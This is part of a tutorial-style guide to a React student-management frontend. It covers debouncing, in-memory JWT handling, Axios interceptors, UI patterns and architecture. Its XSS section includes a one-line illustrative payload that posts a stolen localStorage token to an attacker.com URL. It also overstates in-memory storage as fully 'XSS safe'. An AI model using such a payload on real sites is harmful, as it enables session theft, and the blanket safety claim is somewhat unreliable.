{/* Subtle refresh indicator — shown when updating existing data */}
{loading && students.length > 0 && (
  <div>
    <Spinner size="sm" />
    <span>Updating...</span>
  </div>
)}
```

This distinction between "initial load" (full spinner) and "background refresh" (subtle indicator) is an important UX consideration — blocking the entire table for a background refresh would feel jarring.

---

### 50. Optimistic vs Server-Confirmed Updates

**What they are**

- **Optimistic update**: Immediately update the UI assuming the server will succeed, then revert if it fails
- **Server-confirmed update**: Wait for the server response, then update the UI based on the actual response

**How this project uses server-confirmed updates**

This project uses server-confirmed updates throughout:

```ts
// createStudent — waits for server response before updating UI
const newStudent = await studentsApi.create(payload);
setStudents((prev) => [...prev, newStudent]); // Use actual server response (with real id)
```

```ts
// updateStudent — waits for server response
const updated = await studentsApi.update(id, payload);
setStudents((prev) => prev.map((s) => (s.id === id ? updated : s)));
```

```ts
// deleteStudent — waits for server confirmation
await studentsApi.delete(id);
setStudents((prev) => prev.filter((s) => s.id !== id));
```

This approach is simpler and safer — you never have to implement rollback logic. The trade-off is a slight delay in UI update that is mitigated by the `loading` state showing visual feedback.

---

### 51. Search and Filter State with Debouncing

**What debouncing is**

Debouncing delays the execution of a function until a specified time has passed without the function being called again. For search inputs, this means the API is not called on every keystroke — only after the user pauses typing.

**Why it is used**

Without debouncing, typing "Smith" would fire 5 API requests (S, Sm, Smi, Smit, Smith). With 400ms debouncing, only the final "Smith" request fires (assuming the user types faster than 400ms between keys).

**How it works in this project**

**Code snippet — `src/pages/StudentsPage.tsx`**

```tsx
// Store the timer handle in state (used to cancel previous timer)
const [searchDebounce, setSearchDebounce] = useState<ReturnType<typeof setTimeout> | null>(null);

const handleSearchChange = (value: string) => {
  setSearchValue(value);                         // Update input immediately
  if (searchDebounce) clearTimeout(searchDebounce); // Cancel previous timer
  const t = setTimeout(() => {                    // Schedule new timer
    if (value.trim()) {
      searchStudents(searchType, value.trim());   // Fire after 400ms pause
    } else {
      fetchAll();                                 // Empty input = show all
    }
  }, 400);
  setSearchDebounce(t); // Store timer handle for next cancellation
};
```

Note: storing the timer handle in `useState` rather than `useRef` means each new timer update triggers a re-render. This is a minor inefficiency. A production optimization would use `useRef` for the timer, though the functional result is identical.

---

## JWT on the Frontend

---

### 52. JWT Token Storage in Memory

**What it is**

JSON Web Tokens (JWTs) are the authentication credential in this application. Where you store them in the browser has significant security implications. This project stores the token exclusively in React component state (`useState`) — JavaScript heap memory.

**Why memory is the correct choice here**

| Storage | XSS Safe | Survives Refresh | CSRF Risk |
|---------|----------|-----------------|-----------|
| `localStorage` | No | Yes | No |
| `sessionStorage` | No | No | No |
| HttpOnly Cookie | Yes | Yes | Yes (mitigable) |
| Memory (React state) | Yes | No | No |

Memory storage is safe from XSS because `localStorage` and `sessionStorage` are global browser APIs accessible to any script on the page — including injected malicious scripts. React state lives inside the JavaScript closure of the component and is not accessible via browser APIs.

**Code snippet — `src/context/AuthContext.tsx`**

```tsx
// This is the ONLY place the token is stored — in React state
const [token, setToken] = useState<string | null>(null);

// There is NO:
// localStorage.setItem('token', newToken);
// sessionStorage.setItem('token', newToken);
// document.cookie = 'token=' + newToken;
```

---

### 53. JWT Decoding Without a Library

**What it is**

A JWT has three parts separated by dots: `header.payload.signature`. The payload is base64url-encoded JSON containing claims like `sub` (subject/user), `exp` (expiry), and `iat` (issued at). This project includes a minimal decoder that extracts the payload without verifying the signature.

**Why no library is used**

The only information needed from the token is the `exp` claim (to schedule auto-logout). A full JWT library would add significant bundle weight for a single use case. The custom decoder is 20 lines and handles exactly what is needed.

**Important note**: this decoder does NOT verify the JWT signature. Signature verification is the server's responsibility — the backend validates every request. The frontend only decodes the payload to read timing information.

**Code snippet — `src/utils/jwt.ts`**

```ts
export function jwtDecode(token: string): JwtPayload | null {
  try {
    const parts = token.split('.');
    if (parts.length !== 3) return null;

    const payload = parts[1]; // The middle section
    // base64url uses - and _ instead of + and /
    const padded = payload.replace(/-/g, '+').replace(/_/g, '/');
    const decoded = atob(padded); // Browser's built-in base64 decoder
    return JSON.parse(decoded) as JwtPayload;
  } catch {
    return null;
  }
}
```

`atob()` is the browser's native base64 decoder — no import needed. The try/catch ensures any malformed token silently returns `null` instead of crashing.

---

### 54. Reading the exp Claim for Auto-Logout

**What the exp claim is**

The `exp` (expiration) claim in a JWT payload is a Unix timestamp in **seconds** representing when the token expires. `Date.now()` returns milliseconds since epoch, so the conversion `decoded.exp * 1000` is required.

**Code snippet — `src/context/AuthContext.tsx`**

```tsx
const decoded = jwtDecode(tok);
if (decoded?.exp) {
  const msUntilExpiry = decoded.exp * 1000 - Date.now();
  // decoded.exp is seconds since epoch (e.g. 1750000000)
  // Date.now() is milliseconds since epoch (e.g. 1749999000000)
  // * 1000 converts exp to milliseconds

  if (msUntilExpiry > 0) {
    logoutTimerRef.current = setTimeout(() => {
      logout();
    }, msUntilExpiry);
  } else {
    logout(); // Token already expired before login call returned
  }
}
```

---

### 55. Bearer Token Pattern

**What it is**

The `Authorization: Bearer <token>` HTTP header is the standard way to send a JWT to a server in REST API calls. "Bearer" indicates the holder (bearer) of this token is authorized.

**How it works in this project**

The request interceptor in `axiosInstance.ts` automatically attaches this header to every request:

```ts
axiosInstance.interceptors.request.use((config) => {
  const token = authTokenGetter ? authTokenGetter() : null;
  if (token) {
    config.headers.Authorization = `Bearer ${token}`;
    // Results in: Authorization: Bearer eyJhbGciOiJIUzI1NiJ9...
  }
  return config;
});
```

The Spring Boot backend reads this header, validates the JWT signature, and either processes the request (valid token) or returns 401 (invalid/expired token).

---

## Security Concepts

---

### 56. XSS and Why localStorage is Unsafe for Tokens

**What XSS is**

Cross-Site Scripting (XSS) is an attack where an adversary injects malicious JavaScript into a web page that is then executed in a victim's browser. This can happen through:
- Unescaped user-generated content in the DOM
- Compromised third-party scripts (supply chain attacks)
- Browser extensions with excessive permissions

**Why localStorage is dangerous for tokens**

Any JavaScript running on the page has full access to `localStorage`:

```js
// An XSS payload could do this:
const token = localStorage.getItem('jwt_token');
fetch('https://attacker.com/steal', { method: 'POST', body: token });
```

Once the token is stolen, the attacker can make API requests as the victim from anywhere in the world — even after the XSS is fixed — until the token expires.

**Why memory storage prevents this**

React state is not accessible via browser APIs. A malicious script cannot call `React.useState()` to read component state — there is no such global API. The token is only accessible within the JavaScript closure of the `AuthProvider` component, which is not externally accessible.

**Code snippet — `src/context/AuthContext.tsx`**

```tsx
// The token is never written to any persistent browser storage
const [token, setToken] = useState<string | null>(null);

// An XSS payload CANNOT access this:
// - localStorage.getItem('token') → returns null (never stored)
// - window.token → undefined
// - document.cookie → no token cookie exists
```

---

### 57. Memory Storage Trade-offs

**The primary trade-off**

Memory storage means the token is lost when:
- The user refreshes the page
- The user closes the tab
- The browser navigates away

The user must log in again after any of these events.

**When this is acceptable**

- Enterprise apps where security is prioritized over convenience
- Applications with short session durations (e.g., banking apps that log you out after 15 minutes anyway)
- Applications where the login process is fast (no MFA or complex flows)

**When this is NOT acceptable**

- Consumer apps where UX is paramount ("why do I have to log in every time?")
- Long-lived sessions

**Alternative: HttpOnly Cookies**

HttpOnly cookies are inaccessible to JavaScript (the browser never exposes them to scripts) and survive page refreshes. They are the gold standard but require server-side configuration for CSRF protection and are outside this project's scope.

---

### 58. 401 Interceptor — Automatic Logout

**What it is**

A 401 Unauthorized response from the server means the JWT is expired or invalid. The response interceptor catches every 401 globally and triggers logout — clearing the token from memory and redirecting to login.

**Why this is a security feature**

Without the interceptor, a user might see an error message and remain "logged in" in the UI with an invalid token. The interceptor ensures the UI state always matches the actual authentication state as determined by the server.

**Code snippet — `src/api/axiosInstance.ts`**

```ts
axiosInstance.interceptors.response.use(
  (response) => response,
  (error) => {
    if (error.response?.status === 401 && onUnauthorized) {
      onUnauthorized(); // Triggers AuthContext.logout()
      // This sets token to null → isAuthenticated becomes false
      // → ProtectedRoute redirects to /login
      // → Navbar switches to unauthenticated view
    }
    return Promise.reject(error);
  }
);
```

The chain of effects:
1. `onUnauthorized()` calls `logout()` from `AuthContext`
2. `logout()` calls `setToken(null)`
3. `token` becomes `null` → `isAuthenticated` becomes `false`
4. React re-renders: `ProtectedRoute` sees `isAuthenticated === false`, redirects to `/login`
5. `Navbar` re-renders to show Sign In / Register links

---

## UI/UX Patterns

---

### 59. Toast Notifications

**What they are**

Toast notifications are brief, non-blocking messages that appear at the edge of the screen to provide feedback on actions. They disappear automatically after a timeout.

**Why react-hot-toast is used**

`react-hot-toast` is lightweight, requires no context setup (it uses a singleton), and provides a clean API: `toast.success('message')` and `toast.error('message')`.

**How it is configured in this project**

**Code snippet — `src/App.tsx`**

```tsx
<Toaster
  position="top-right"
  toastOptions={{
    duration: 4000,
    style: {
      background: '#fff',
      color: '#1f2937',
      borderRadius: '12px',
      border: '1px solid #e5e7eb',
      boxShadow: '0 10px 25px -5px rgba(0,0,0,0.1)',
      fontSize: '14px',
      padding: '12px 16px',
    },
    success: { iconTheme: { primary: '#4f46e5', secondary: '#fff' } },
    error: { iconTheme: { primary: '#ef4444', secondary: '#fff' } },
  }}
/>
```

**Usage throughout the app**

```ts
// useStudents.ts
toast.success('Student created successfully!');
toast.success('Student updated successfully!');
toast.success('Student deleted successfully!');
toast.error(msg); // On any API error

// LoginPage.tsx
toast.success('Welcome back!');
toast.error(getErrorMessage(err));

// RegisterPage.tsx
toast.success('Account created! Welcome to StudentMS.');
```

---

### 60. Modal Dialogs for Create, Edit, and Delete

**Why modals for CRUD**

The alternative to modals is inline editing (turning table cells into inputs) or navigating to separate pages. Modals keep the user in context — they can see the student table behind the modal and do not lose their place.

**How the three modals are managed in `StudentsPage`**

```tsx
// Three separate state variables control three modals
const [showAddModal, setShowAddModal]       = useState(false);
const [editingStudent, setEditingStudent]   = useState<Student | null>(null);
const [deletingStudent, setDeletingStudent] = useState<Student | null>(null);

// Add modal — triggered by a button
<Modal isOpen={showAddModal} onClose={() => setShowAddModal(false)} title="Add New Student">
  <StudentForm onSubmit={handleAddSubmit} onCancel={() => setShowAddModal(false)} loading={loading} />
</Modal>

// Edit modal — triggered by clicking a row's edit button
// The editingStudent value being non-null IS the open condition
<Modal isOpen={!!editingStudent} onClose={() => setEditingStudent(null)} title="Edit Student">
  {editingStudent && (
    <StudentForm initialData={editingStudent} onSubmit={handleEditSubmit} ... />
  )}
</Modal>

// Delete modal — triggered by clicking a row's delete button
<ConfirmDialog
  isOpen={!!deletingStudent}
  onConfirm={handleDeleteConfirm}
  message={`Are you sure you want to delete ${deletingStudent?.firstName}...`}
  ...
/>
```

Using the value itself as the open condition (`!!editingStudent`) is an elegant pattern — there is no separate boolean state, and the student data is available inside the modal without additional plumbing.

---

### 61. Table with Hover Actions

**What it is**

Edit and delete actions are hidden by default and appear only when the user hovers over a table row. This reduces visual clutter while keeping actions discoverable.

**Code snippet — `src/pages/StudentsPage.tsx` (StudentRow)**

```tsx
<tr className="group hover:bg-gray-50 transition-colors">
  {/* ... data cells ... */}
  <td className="px-6 py-4">
    {/* opacity-0 by default, opacity-100 on parent group hover */}
    <div className="flex items-center justify-end gap-2 opacity-0 group-hover:opacity-100 transition-opacity">
      <button onClick={onEdit}   className="... hover:text-indigo-600 hover:bg-indigo-50 ...">
        {/* Edit icon */}
      </button>
      <button onClick={onDelete} className="... hover:text-red-600 hover:bg-red-50 ...">
        {/* Delete icon */}
      </button>
    </div>
  </td>
</tr>
```

Tailwind's `group` utility is key here: applying `group` to the `<tr>` makes it possible to style descendants based on the row's hover state using `group-hover:`. The action buttons transition from invisible (`opacity-0`) to visible (`opacity-100`) with a smooth `transition-opacity`.

Each button also changes icon color on hover: edit icon turns indigo, delete icon turns red — providing immediate visual indication of the action's nature.

---

### 62. Responsive Design with Tailwind

**What it is**

Responsive design means the layout adapts to different screen sizes. Tailwind uses breakpoint prefixes (`sm:`, `md:`, `lg:`) to apply styles only at or above that screen width.

**Tailwind breakpoints**

| Prefix | Min-width | Typical target |
|--------|-----------|---------------|
| (none) | 0px | Mobile first (base styles) |
| `sm:` | 640px | Large phones / small tablets |
| `md:` | 768px | Tablets |
| `lg:` | 1024px | Laptops |
| `xl:` | 1280px | Desktops |

**How it works in this project**

**Code snippet — `src/pages/StudentsPage.tsx`**

```tsx
{/* Stack vertically on mobile, horizontal on sm+ */}
<div className="flex flex-col sm:flex-row sm:items-center sm:justify-between gap-4 mb-8">
  ...
</div>

{/* Max width container with responsive padding */}
<div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-8">
```

**Code snippet — `src/components/Navbar.tsx`**

```tsx
{/* Nav links hidden on mobile (hidden), shown on sm+ (sm:flex) */}
<div className="hidden sm:flex items-center gap-1">
  <Link to="/students">Students</Link>
</div>
```

**Code snippet — `src/pages/LoginPage.tsx`**

```tsx
{/* Full height gradient background, centered card */}
<div className="min-h-screen bg-gradient-to-br from-indigo-50 via-white to-purple-50 flex items-center justify-center p-4">
  <div className="w-full max-w-md">
    {/* Card takes full width on mobile, max-md on larger screens */}
  </div>
</div>
```

---

### 63. Empty State Handling

**What it is**

An "empty state" is a purposefully designed UI for when a list or data set has no items. A blank white space with no explanation creates a poor user experience; a thoughtful empty state guides the user on what to do next.

**How it works in this project**

`StudentsPage` distinguishes between two types of "empty":

1. **No students exist** — show an encouraging message and an "Add Student" button
2. **Search returned no results** — show a message suggesting to try different search terms

**Code snippet — `src/pages/StudentsPage.tsx`**

```tsx
students.length === 0 ? (
  <div className="flex flex-col items-center justify-center py-24 text-center">
    <div className="h-16 w-16 rounded-2xl bg-gray-100 flex items-center justify-center mb-4">
      {/* Students icon */}
    </div>
    <p className="text-gray-900 font-medium">No students found</p>
    <p className="text-sm text-gray-500 mt-1">
      {searchValue
        ? 'Try a different search term.'         // Search context
        : 'Get started by adding your first student.' // Empty database context
      }
    </p>
    {!searchValue && (
      <Button className="mt-4" onClick={() => setShowAddModal(true)}>
        Add Student
      </Button>
    )}
  </div>
)
```

The `searchValue` check is important — it provides context-appropriate guidance. When searching, showing "Add Student" would be confusing; when the database is empty, it is the correct call to action.

---

### 64. Form Validation Feedback

**What it is**

Inline validation feedback displays error messages directly below the relevant form field in real time, rather than waiting for form submission and showing a list of errors at the top.

**Why inline feedback is better UX**

- Users know immediately which field has an error
- Errors appear in context, next to the field they describe
- Users do not have to scroll to find error messages

**How it works in this project**

React Hook Form validates fields on blur (when the user leaves a field) and on every change after the first validation. The `Input` component renders the error message directly under the input:

**Code snippet — `src/components/Input.tsx`**

```tsx
{error && <p className="text-xs text-red-600">{error}</p>}
```

The input border also changes to red when there is an error:

```tsx
className={`
  ...
  ${error ? 'border-red-400 bg-red-50' : 'border-gray-300 bg-white hover:border-gray-400'}
`}
```

**Validation rules with messages — `src/components/StudentForm.tsx`**

```tsx
{...register('email', {
  required: 'Email is required',
  pattern: {
    value: /^[^\s@]+@[^\s@]+\.[^\s@]+$/,
    message: 'Enter a valid email address',
  },
})}
```

Each validation rule provides its own specific error message rather than a generic "invalid" message.

---

## Project Architecture

---

### 65. Folder Structure by Concern

**What it is**

The project organizes files by their architectural role (what they do) rather than by feature (what domain they belong to). This is appropriate for a single-domain app like this student management system.

**Project directory structure**

```
src/
├── api/
│   ├── axiosInstance.ts    # HTTP client configuration and interceptors
│   ├── authApi.ts          # Auth-related API calls
│   └── studentsApi.ts      # Student CRUD API calls
│
├── components/             # Reusable UI components (not tied to a specific page)
│   ├── Button.tsx
│   ├── ConfirmDialog.tsx
│   ├── Input.tsx
│   ├── Modal.tsx
│   ├── Navbar.tsx
│   ├── ProtectedRoute.tsx
│   ├── Spinner.tsx
│   └── StudentForm.tsx
│
├── context/
│   └── AuthContext.tsx     # Global auth state provider
│
├── hooks/
│   └── useStudents.ts      # Custom hook for student data operations
│
├── pages/                  # Route-level components (one per route)
│   ├── LoginPage.tsx
│   ├── RegisterPage.tsx
│   └── StudentsPage.tsx
│
├── types/
│   └── index.ts            # All TypeScript interfaces and type aliases
│
├── utils/
│   ├── errorHandler.ts     # Axios error → readable string
│   └── jwt.ts              # JWT payload decoder
│
├── App.tsx                 # Root component: routing, providers, Toaster
├── main.tsx                # React DOM entry point
└── index.css               # Global styles and Tailwind directives
```

**Why this structure**

- `api/` — Changing the HTTP library only requires changes in this folder
- `components/` — Adding a new page reuses components from here without touching them
- `context/` — Global state can be found here immediately
- `hooks/` — Business logic can be found here, separated from rendering
- `pages/` — Each file corresponds to one URL route — easy to navigate
- `types/` — Type definitions are centralized, not scattered across files
- `utils/` — Pure utility functions with no React dependencies, easily unit-tested

---

### 66. Separation of Concerns

**What it is**

Separation of concerns (SoC) is the principle that different parts of a system should manage different responsibilities and know as little as possible about each other.

**How it is applied in this project**

| Layer | File(s) | Responsibility | What it does NOT know |
|-------|---------|---------------|----------------------|
| HTTP Layer | `axiosInstance.ts` | Configure HTTP client, manage interceptors | What data means, React state |
| API Layer | `authApi.ts`, `studentsApi.ts` | Map function calls to HTTP requests | UI, state, validation |
| State/Logic Layer | `useStudents.ts`, `AuthContext.tsx` | Manage data state, call API, handle errors | How data is rendered |
| UI Layer | `components/`, `pages/` | Render UI, handle user interactions | HTTP details, JWT internals |
| Type Layer | `types/index.ts` | Define data shapes | Implementation details |
| Utility Layer | `utils/` | Pure functions | React, HTTP, application state |

**Concrete example**

When `StudentsPage` deletes a student:

1. `StudentsPage` calls `deleteStudent(id)` — it knows nothing about HTTP
2. `useStudents.deleteStudent` calls `studentsApi.delete(id)` — it knows nothing about UI rendering
3. `studentsApi.delete` calls `axiosInstance.delete(url)` — it knows nothing about auth or state
4. `axiosInstance` sends the request with the Bearer token — it knows nothing about React components
5. The response flows back up the chain; each layer handles its own concern

---

### 67. Component Composition Pattern

**What it is**

Component composition means building complex UI by combining simple, focused components rather than building monolithic components that do everything. React's `children` prop is the primary mechanism.

**How it works in this project**

`ConfirmDialog` is a composition of `Modal` + `Button`:

```tsx
const ConfirmDialog = ({ isOpen, onClose, onConfirm, title, message }) => {
  return (
    <Modal isOpen={isOpen} onClose={onClose} title={title} maxWidth="sm">
      {/* Modal provides the overlay, backdrop, header, Escape handler */}
      {/* ConfirmDialog only cares about its specific content */}
      <div>
        <p>{message}</p>
        <Button variant="secondary" onClick={onClose}>Cancel</Button>
        <Button variant="danger" onClick={onConfirm}>Delete</Button>
      </div>
    </Modal>
  );
};
```

`StudentForm` composes `Input` and `Button`:

```tsx
<form>
  <Input label="First Name" {...register('firstName', ...)} error={errors.firstName?.message} />
  <Input label="Last Name"  {...register('lastName', ...)}  error={errors.lastName?.message} />
  <Input label="Email"      {...register('email', ...)}     error={errors.email?.message} />
  <Button type="submit" loading={loading}>Add Student</Button>
</form>
```

Each level of composition only assembles its direct children — `StudentForm` does not know that `Input` uses `forwardRef` internally, and `Modal` does not know it is hosting a delete confirmation.

---

### 68. End-to-End Data Flow

**The complete lifecycle of a student deletion**

This section traces every layer of the application for a single user action — deleting a student. This illustrates how all the concepts in this document connect.

**Step 1 — User hovers over a row**

Tailwind's `group-hover:opacity-100` makes the action buttons visible. No state changes, no re-renders.

**Step 2 — User clicks the delete (trash) icon**

```tsx
// StudentRow.tsx — the onClick callback
<button onClick={onDelete}>...</button>

// StudentsPage.tsx — onDelete was bound to this:
onDelete={() => setDeletingStudent(student)
```

`setDeletingStudent(student)` triggers a re-render of `StudentsPage`. `deletingStudent` is now a `Student` object.

**Step 3 — ConfirmDialog renders**

```tsx
<ConfirmDialog
  isOpen={!!deletingStudent}  // true — dialog opens
  message={`Are you sure you want to delete ${deletingStudent.firstName}...`}
  ...
/>
```

The `Modal` inside `ConfirmDialog` registers a `keydown` event listener for Escape and sets `document.body.style.overflow = 'hidden'`.

**Step 4 — User clicks "Delete" button**

```tsx
<Button variant="danger" onClick={onConfirm} loading={loading}>Delete</Button>
```

`onConfirm` is `handleDeleteConfirm` from `StudentsPage`:

```tsx
const handleDeleteConfirm = useCallback(async () => {
  if (!deletingStudent) return;
  setDeleteLoading(true);  // Button shows spinner
  try {
    await deleteStudent(deletingStudent.id);
    setDeletingStudent(null); // Close dialog on success
  } finally {
    setDeleteLoading(false);
  }
}, [deletingStudent, deleteStudent]);
```

**Step 5 — useStudents.deleteStudent executes**

```ts
const deleteStudent = useCallback(async (id: number) => {
  setLoading(true);
  try {
    await studentsApi.delete(id);             // Call API layer
    setStudents((prev) => prev.filter((s) => s.id !== id)); // Remove from state
    toast.success('Student deleted successfully!');
  } catch (err) {
    const msg = getErrorMessage(err);
    toast.error(msg);
    throw err;
  } finally {
    setLoading(false);
  }
}, []);
```

**Step 6 — studentsApi.delete sends the HTTP request**

```ts
delete: async (id: number): Promise<void> => {
  await axiosInstance.delete(`/api/students/${id}`);
}
```

**Step 7 — Request interceptor attaches the token**

```ts
axiosInstance.interceptors.request.use((config) => {
  const token = authTokenGetter ? authTokenGetter() : null;
  if (token) {
    config.headers.Authorization = `Bearer ${token}`;
    // DELETE http://localhost:8081/api/students/42
    // Authorization: Bearer eyJhbGciOiJIUzI1NiJ9...
  }
  return config;
});
```

**Step 8 — Spring Boot processes the request**

The backend validates the JWT, finds the student by ID, deletes it from the database, and returns HTTP 204 No Content.

**Step 9 — Response flows back**

Response interceptor passes the 204 through (no error). `studentsApi.delete` resolves. `useStudents.deleteStudent` updates state:

```ts
setStudents((prev) => prev.filter((s) => s.id !== id));
```

**Step 10 — React re-renders**

The `students` array no longer contains the deleted student. `StudentsPage` re-renders. The deleted student's row is gone from the table. `toast.success` shows "Student deleted successfully!" in the top-right corner.

**Step 11 — Dialog cleanup**

`setDeletingStudent(null)` in `handleDeleteConfirm` triggers another re-render. `ConfirmDialog` receives `isOpen={false}`. The `Modal` returns `null`, removing the overlay from the DOM. The Escape key listener is removed and `document.body.style.overflow` is restored.

---

**The complete flow in one diagram:**

```
Click delete icon
      |
setDeletingStudent(student)        → ConfirmDialog opens
      |
Click "Delete" button
      |
handleDeleteConfirm()
      |
setDeleteLoading(true)             → Button shows Spinner
      |
useStudents.deleteStudent(id)
      |
setLoading(true)                   → Loading indicator shown
      |
studentsApi.delete(id)
      |
axiosInstance.delete('/api/students/42')
      |
[Request Interceptor: attach Bearer token]
      |
HTTP DELETE → Spring Boot API
      |
HTTP 204 No Content ←
      |
[Response Interceptor: passes through]
      |
studentsApi.delete resolves
      |
setStudents(prev.filter(s => s.id !== id))  → Student removed from array
toast.success('Student deleted!')           → Toast notification shown
setLoading(false)                           → Loading indicator hidden
      |
(back in handleDeleteConfirm)
setDeletingStudent(null)                    → ConfirmDialog closes
setDeleteLoading(false)                     → Button spinner hidden
      |
React reconciles and re-renders table
Deleted student row is gone ✓
```

---

*This document covers all 68 concepts as implemented in the `student-management-ui` project. Each section ties theory directly to the actual source code, making this a complete reference for understanding every architectural and implementation decision in the codebase.*
